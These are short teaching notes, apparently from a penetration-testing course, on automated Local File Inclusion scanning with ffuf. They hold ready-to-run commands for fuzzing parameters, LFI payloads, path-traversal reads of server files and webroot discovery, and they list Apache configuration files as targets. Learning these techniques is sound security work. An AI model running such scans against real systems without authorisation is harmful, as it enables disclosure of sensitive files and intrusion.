# Automated LFI Scanning – Notes

## 1. Introduction

Automated scanning helps identify LFI vulnerabilities quickly using fuzzing tools.

---

## 2. Parameter Fuzzing

### Goal
Find hidden parameters

### Command
```
ffuf -w burp-parameter-names.txt:FUZZ -u 'http://target/index.php?FUZZ=value'
```

---

## 3. LFI Payload Fuzzing

### Goal
Test multiple LFI payloads

### Command
```
ffuf -w LFI-Jhaddix.txt:FUZZ -u 'http://target/index.php?language=FUZZ'
```

---

## 4. Server File Fuzzing

### Goal
Find sensitive files

### Command
```
ffuf -w LFI-WordList-Linux:FUZZ -u 'http://target/index.php?language=../../../../FUZZ'
```

---

## 5. Webroot Discovery

### Goal
Find server root path

### Command
```
ffuf -w default-web-root-directory-linux.txt:FUZZ -u 'http://target/index.php?language=../../../../FUZZ/index.php'
```

---

## 6. Configuration Files

### Examples
```
/etc/apache2/apache2.conf
/etc/apache2/envvars
```

---

## 7. Key Takeaways

- Fuzzing speeds up discovery
- Use wordlists for automation
- Combine manual + automated methods
- Config files reveal critical information
